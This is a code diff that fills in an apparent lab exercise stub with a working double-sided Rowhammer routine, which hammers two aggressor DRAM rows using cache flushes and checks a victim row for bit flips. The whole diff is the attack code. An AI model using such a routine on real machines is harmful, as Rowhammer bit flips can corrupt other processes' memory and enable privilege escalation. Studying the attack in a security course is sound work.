@@ -26,10 +26,66 @@ char *dram_to_str(uint64_t phys_ptr);
  *
  */
 uint64_t hammer_addresses(uint64_t vict, uint64_t attA, uint64_t attB, uint64_t hp_base) {
-                      
-    uint64_t foundFlips = 0;
-    // TODO: Exercise 4-1
-    return foundFlips; 
+    (void)hp_base;
+
+    auto row_base_from_virt = [](uint64_t virt_addr) -> uint64_t {
+        uint64_t phys_addr = virt_to_phys(virt_addr);
+        if (phys_addr == 0) {
+            return 0;
+        }
+
+        uint64_t row_phys = phys_addr & ~(ROW_SIZE - 1ULL);
+        return phys_to_virt(row_phys);
+    };
+
+    uint64_t vict_row = row_base_from_virt(vict);
+    uint64_t attA_row = row_base_from_virt(attA);
+    uint64_t attB_row = row_base_from_virt(attB);
+
+    if (vict_row == 0 || attA_row == 0 || attB_row == 0) {
+        return 0;
+    }
+
+    memset((void*)vict_row, VIC_DATA, ROW_SIZE);
+    memset((void*)attA_row, AGG_DATA, ROW_SIZE);
+    memset((void*)attB_row, AGG_DATA, ROW_SIZE);
+
+    mfence();
+
+    for (uint64_t off = 0; off < ROW_SIZE; off += CACHELINE_SIZE) {
+        clflush((void*)(vict_row + off));
+        clflush((void*)(attA_row + off));
+        clflush((void*)(attB_row + off));
+    }
+
+    mfence();
+
+    volatile uint8_t* attA_ptr = reinterpret_cast<volatile uint8_t*>(attA);
+    volatile uint8_t* attB_ptr = reinterpret_cast<volatile uint8_t*>(attB);
+
+    for (uint64_t i = 0; i < HAMMERS_PER_ITER; i++) {
+        (void)*attA_ptr;
+        (void)*attB_ptr;
+        clflush(attA_ptr);
+        clflush(attB_ptr);
+    }
+
+    mfence();
+
+    for (uint64_t off = 0; off < ROW_SIZE; off += CACHELINE_SIZE) {
+        clflush((void*)(vict_row + off));
+    }
+
+    mfence();
+
+    uint8_t* vict_ptr = reinterpret_cast<uint8_t*>(vict_row);
+    for (uint64_t off = 0; off < ROW_SIZE; off++) {
+        if (vict_ptr[off] != VIC_DATA) {
+            return 1;
+        }
+    }
+
+    return 0;
 }
 
 /*
